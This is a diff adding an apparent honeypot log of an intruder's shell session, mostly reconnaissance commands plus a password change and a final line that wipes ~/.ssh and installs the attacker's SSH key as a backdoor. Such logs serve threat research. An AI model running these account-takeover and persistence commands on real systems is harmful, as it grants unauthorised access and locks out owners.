@@ -1,0 +1,17 @@
+2021-05-01 05:20:28.184360+00:00 -|::|- cat /proc/cpuinfo | grep name | wc -l
+2021-05-01 05:20:28.726944+00:00 -|::|- echo -e "123qweASD\nHr2a25Ld4jgb\nHr2a25Ld4jgb"|passwd|bash
+2021-05-01 05:20:28.727768+00:00 -|::|- Enter new UNIX password: 
+2021-05-01 05:20:29.408355+00:00 -|::|- echo "123qweASD\nHr2a25Ld4jgb\nHr2a25Ld4jgb\n"|passwd
+2021-05-01 05:20:30.092580+00:00 -|::|- cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+2021-05-01 05:20:30.637420+00:00 -|::|- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+2021-05-01 05:20:31.297169+00:00 -|::|- ls -lh $(which ls)
+2021-05-01 05:20:31.297617+00:00 -|::|- which ls
+2021-05-01 05:20:31.831504+00:00 -|::|- crontab -l
+2021-05-01 05:20:32.475223+00:00 -|::|- w
+2021-05-01 05:20:33.123182+00:00 -|::|- uname -m
+2021-05-01 05:20:33.679149+00:00 -|::|- cat /proc/cpuinfo | grep model | grep name | wc -l
+2021-05-01 05:20:34.311302+00:00 -|::|- top
+2021-05-01 05:20:34.974199+00:00 -|::|- uname
+2021-05-01 05:20:35.512095+00:00 -|::|- uname -a
+2021-05-01 05:20:36.149228+00:00 -|::|- lscpu | grep Model
+2021-05-01 05:20:36.679712+00:00 -|::|- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
